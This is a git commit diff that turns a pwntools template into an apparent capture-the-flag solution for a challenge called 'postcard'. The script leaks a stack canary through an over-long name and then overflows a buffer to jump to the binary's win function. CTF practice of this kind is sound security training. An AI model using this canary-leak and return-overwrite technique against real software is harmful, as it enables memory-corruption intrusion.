213f297655b17fb19bf12ec36a2ef33ac0bddcd7
Expressionless <expressionless.dev@gmail.com>
2026-09-16 13:38:03 +0000

    upsolve postcard

--- postcard/tmpl.py
+++ postcard/tmpl.py
@@ -1,7 +1,9 @@
 from pwn import *
-from config import REMOTE_ADDR, REMOTE_PORT
+
+context.log_level = 'debug'
 
 REMOTE = 0 # Change to 1 to run the exploit on the remote instance
+GDB = False
 
 e = context.binary = ELF("./chal")
 
@@ -9,12 +11,21 @@ if REMOTE:
     p = remote(REMOTE_ADDR, REMOTE_PORT)
 else:
     p = e.process()
+    if GDB:
+        context.terminal = ['tmux', 'splitw', '-h']
+        gdb.attach(p, """
+            b main
+            b print_wrapped
+        """)
 
 io = r = p # use whichever you like for communication
 
-NAME = "teddy"
-MESSAGE = "get gud at kernel pwn m8!! "
+NAME = b'a' * 0xd9
 
 p.sendafter(b"name: ", NAME)
-p.sendafter(b": ", MESSAGE)
-print(p.recvall().decode())
+res = p.recv(0x105)
+canary = b'\x00' + res[0xf5:(0xf5+8)][1:]
+win = p64(e.sym.win)
+
+MESSAGE = b"a"*0x68 + canary + b'a' * 8 + win
+p.sendline(MESSAGE)
